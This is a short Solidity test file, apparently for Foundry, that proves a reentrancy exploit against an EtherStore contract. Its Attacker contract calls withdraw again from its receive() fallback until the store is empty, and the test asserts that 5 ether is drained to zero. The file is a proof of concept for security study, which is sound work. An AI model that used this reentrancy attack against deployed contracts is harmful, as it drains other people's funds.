pragma solidity ^0.8.20;

import "../src/EtherStore.sol";

interface Vm { function deal(address, uint256) external; }

contract Attacker {
    EtherStore public store;
    constructor(EtherStore _s) { store = _s; }
    function attack() external payable { store.deposit{value: 1 ether}(); store.withdraw(); }
    receive() external payable {
        if (address(store).balance >= 1 ether) { store.withdraw(); }
    }
}

contract ExploitTest {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D); // forge cheatcode addr
    EtherStore store;
    function setUp() public {
        store = new EtherStore();
        vm.deal(address(this), 10 ether);
        store.deposit{value: 5 ether}();
    }
    receive() external payable {}
    function test_exploit_drains_store() public {
        Attacker a = new Attacker(store);
        vm.deal(address(a), 1 ether);
        require(address(store).balance == 5 ether, "setup wrong");
        a.attack();
        require(address(store).balance == 0, "NOT DRAINED");
    }
}

